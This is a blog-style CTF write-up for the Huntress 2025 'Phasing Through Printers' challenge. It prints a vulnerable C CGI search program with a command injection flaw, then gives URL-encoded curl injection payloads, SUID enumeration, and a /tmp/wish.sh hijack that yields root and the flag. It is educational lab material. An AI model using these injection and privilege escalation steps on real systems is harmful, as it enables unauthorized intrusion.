<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Huntress CTF 2025 - Phasing Through Printers</title>

  <link rel="stylesheet" href="/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Huntress CTF 2025 - Phasing Through Printers | Writeups</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Huntress CTF 2025 - Phasing Through Printers" />
<meta name="author" content="alphaz3r0" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Challenge Description" />
<meta property="og:description" content="Challenge Description" />
<link rel="canonical" href="http://localhost:4000/writeup/misc/Phasing-Through-Printers" />
<meta property="og:url" content="http://localhost:4000/writeup/misc/Phasing-Through-Printers" />
<meta property="og:site_name" content="Writeups" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-11-01T00:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Huntress CTF 2025 - Phasing Through Printers" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"alphaz3r0","url":"0x41414141-code.github.io"},"dateModified":"2025-11-01T00:00:00+01:00","datePublished":"2025-11-01T00:00:00+01:00","description":"Challenge Description","headline":"Huntress CTF 2025 - Phasing Through Printers","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeup/misc/Phasing-Through-Printers"},"url":"http://localhost:4000/writeup/misc/Phasing-Through-Printers"}</script>
<!-- End Jekyll SEO tag -->

</head>

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    <h1>alphaz3r0@home:~$</h1>
    </a>
    <div class="header-links">
      <button><a href="/"><h2 class="header-link">Home</h2></a></button>
<button><a href="/CTFs"><h2 class="header-link">CTFs</h2></a></button>
<button><a href="/about"><h2 class="header-link">About Me</h2></a></button>
<button><a href="/archive"><h2 class="header-link">Archive</h2></a></button>

    </div>
  </div>
</header>
    <div class="container">
      <section id="main_content">
        <article>
  <h2>Huntress CTF 2025 - Phasing Through Printers</h2>
  <time datetime="2025-11-01T00:00:00+01:00" class="by-line">01 Nov 2025</time>
  <h2 id="challenge-description">Challenge Description</h2>

<blockquote>
  <p>I found this printer on the network, and it seems to be running… a weird web page… to search for drivers?</p>

  <p>Here is some of the code I could dig up.</p>
</blockquote>

<p>NOTE</p>

<blockquote>
  <p>Escalate your privileges and uncover the flag in the <strong><code class="language-plaintext highlighter-rouge">root</code></strong> user’s home directory.</p>
</blockquote>

<hr />

<h2 id="thought-process">Thought process:</h2>

<p>We are provided with folder that has this structure:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>├── cgi-bin
│   └── search.c
└── www
    └── index.html
</code></pre></div></div>

<p>And also give the ip of web application that is running.</p>

<p>Lets see what we have in index.html and search.c:</p>

<h3 id="searchc">search.c:</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;ctype.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">urldecode2</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">char</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">src</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">src</span> <span class="o">==</span> <span class="sc">'%'</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
                    <span class="p">((</span><span class="n">a</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">b</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="o">&amp;&amp;</span>
                    <span class="p">(</span><span class="n">isxdigit</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">isxdigit</span><span class="p">(</span><span class="n">b</span><span class="p">)))</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&gt;=</span> <span class="sc">'a'</span><span class="p">)</span>
                                <span class="n">a</span> <span class="o">-=</span> <span class="sc">'a'</span><span class="o">-</span><span class="sc">'A'</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&gt;=</span> <span class="sc">'A'</span><span class="p">)</span>
                                <span class="n">a</span> <span class="o">-=</span> <span class="p">(</span><span class="sc">'A'</span> <span class="o">-</span> <span class="mi">10</span><span class="p">);</span>
                        <span class="k">else</span>
                                <span class="n">a</span> <span class="o">-=</span> <span class="sc">'0'</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">b</span> <span class="o">&gt;=</span> <span class="sc">'a'</span><span class="p">)</span>
                                <span class="n">b</span> <span class="o">-=</span> <span class="sc">'a'</span><span class="o">-</span><span class="sc">'A'</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">b</span> <span class="o">&gt;=</span> <span class="sc">'A'</span><span class="p">)</span>
                                <span class="n">b</span> <span class="o">-=</span> <span class="p">(</span><span class="sc">'A'</span> <span class="o">-</span> <span class="mi">10</span><span class="p">);</span>
                        <span class="k">else</span>
                                <span class="n">b</span> <span class="o">-=</span> <span class="sc">'0'</span><span class="p">;</span>
                        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="mi">16</span><span class="o">*</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">;</span>
                        <span class="n">src</span><span class="o">+=</span><span class="mi">3</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">src</span> <span class="o">==</span> <span class="sc">'+'</span><span class="p">)</span> <span class="p">{</span>
                        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="sc">' '</span><span class="p">;</span>
                        <span class="n">src</span><span class="o">++</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">src</span><span class="o">++</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span>
<span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">env_value</span><span class="p">;</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">save_env</span><span class="p">;</span>

   <span class="n">printf</span><span class="p">(</span><span class="s">"Content-type: text/html</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
   <span class="n">save_env</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"QUERY_STRING"</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">save_env</span><span class="p">,</span> <span class="s">"q="</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">memmove</span><span class="p">(</span><span class="n">save_env</span><span class="p">,</span> <span class="n">save_env</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">save_env</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>

    <span class="p">}</span>

   <span class="kt">char</span> <span class="o">*</span><span class="n">decoded</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">save_env</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>

   <span class="n">urldecode2</span><span class="p">(</span><span class="n">decoded</span><span class="p">,</span> <span class="n">save_env</span><span class="p">);</span>


   <span class="kt">char</span> <span class="n">first_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"grep -R -i "</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">last_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">" /var/www/html/data/printer_drivers.txt"</span> <span class="p">;</span>
   <span class="kt">size_t</span> <span class="n">totalLength</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">first_part</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">last_part</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">combinedString</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">totalLength</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">combinedString</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to allocate memory"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="n">strcpy</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="n">first_part</span><span class="p">);</span>
   <span class="n">strcat</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="n">decoded</span><span class="p">);</span>
   <span class="n">strcat</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="n">last_part</span><span class="p">);</span>
   <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>

   <span class="n">fp</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Error running command</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"%s&lt;br&gt;"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="n">pclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>

   <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
   <span class="n">free</span><span class="p">(</span><span class="n">combinedString</span><span class="p">);</span>
   <span class="n">free</span><span class="p">(</span><span class="n">decoded</span><span class="p">);</span>
   <span class="n">exit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="indexhtml">index.html:</h3>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;h1&gt;</span>Printer Driver Search<span class="nt">&lt;/h1&gt;</span>
  <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/cgi-bin/search.cgi"</span> <span class="na">method=</span><span class="s">"get"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">placeholder=</span><span class="s">"Enter printer model or driver name"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Search"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>So it takes our input and creates request with adding these two lines:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="kt">char</span> <span class="n">first_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"grep -R -i "</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">last_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">" /var/www/html/data/printer_drivers.txt"</span> <span class="p">;</span>
</code></pre></div></div>

<p>So if we searched for example for string “test” request would be:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-R</span> <span class="nt">-i</span> <span class="nb">test</span> /var/www/html/data/printer_drivers.txt
</code></pre></div></div>

<p>Now it is obvious it will be command injection because we are able to create request that will execute on a server, but we need to modify it a little:</p>

<p>if we can make first and last part sepperate commands we can send a command:</p>

<p>if we are able to send a request that looks like this we can execute commands on an server:</p>

<p><code class="language-plaintext highlighter-rouge">;whoami;</code></p>

<p>lets URL encode the <code class="language-plaintext highlighter-rouge">;</code> and send request with curl:</p>

<p>after sending request like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bwhoami%3B%3B
</code></pre></div></div>

<p>We receive response that confirms our hypotesis:</p>

<p><code class="language-plaintext highlighter-rouge">www-data</code></p>

<p>With this we would be able to gain reverse shell but I found it faster and easier to interact with the server just by commands, and after some commands to see if we can escalate our privilages. After some digging I looked at the files with the <strong>SUID bit set</strong> (the setuid permission):</p>

<p><code class="language-plaintext highlighter-rouge">find / -perm -4000 -type f 2&gt;&amp;1</code></p>

<p><code class="language-plaintext highlighter-rouge">curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bfind%20/%20-perm%20-4000%20-type%20f%202%3E%261%3B"</code></p>

<p>And we see one interesting application that has SUID bit set:</p>

<p><code class="language-plaintext highlighter-rouge">/usr/local/bin/admin_help</code></p>

<p>My first thought was to somehow get it on my machine and preform some reverse engineering but first I ran strings to see if there is anything interesting:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bstrings%20/usr/local/bin/admin_help%3B"
</code></pre></div></div>

<p>And I saw this part:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br&gt;Your wish is my command... maybe :)
&lt;br&gt;chmod +x /tmp/wish.sh &amp;&amp; /tmp/wish.sh
</code></pre></div></div>

<p>So it gives temp file called wish.sh executable bit and executes it. Can we create that file and write to it what we want, lets see if we have privileges to create files in <code class="language-plaintext highlighter-rouge">/tmp</code> folder:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bls%20-ld%20%2Ftmp%3B"
drwxrwxrwt 1 root root 4096 Oct 15 13:13 /tmp
</code></pre></div></div>

<p>that part at the end: <code class="language-plaintext highlighter-rouge">rwt</code> means others can read, write, execute + <strong>sticky bit</strong></p>

<p>Lets echo a command to that file and then run <code class="language-plaintext highlighter-rouge">/usr/local/bin/admin_help</code></p>

<h2 id="exploit">Exploit:</h2>

<p><code class="language-plaintext highlighter-rouge">;echo "whoami" &gt;  /tmp/wish.sh &amp; /usr/local/bin/admin_help;</code></p>

<p>URL encoding it and sending a request with curl we get:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Becho%20%22whoami%22%20%3E%20%20%2Ftmp%2Fwish%2Esh%20%26%20%2Fusr%2Flocal%2Fbin%2Fadmin%5Fhelp%3B"

root
</code></pre></div></div>

<p>And just like that we pwned the system now only thing left is to cat the flag as root.</p>

<h2 id="final-exploit">Final exploit</h2>

<p><code class="language-plaintext highlighter-rouge">;echo "cat /root/flag.txt" &gt;  /tmp/wish.sh &amp; /usr/local/bin/admin_help;</code></p>

<p>URL encoding it and sending a request with curl we get the flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Becho%20%22cat%20%2Froot%2Fflag%2Etxt%22%20%3E%20%20%2Ftmp%2Fwish%2Esh%20%26%20%2Fusr%2Flocal%2Fbin%2Fadmin%5Fhelp%3B"

flag{93541544b91b7d2b9d61e90becbca309}
</code></pre></div></div>

</article>
      </section>
    </div>
  </div>

   

  
</body>

</html>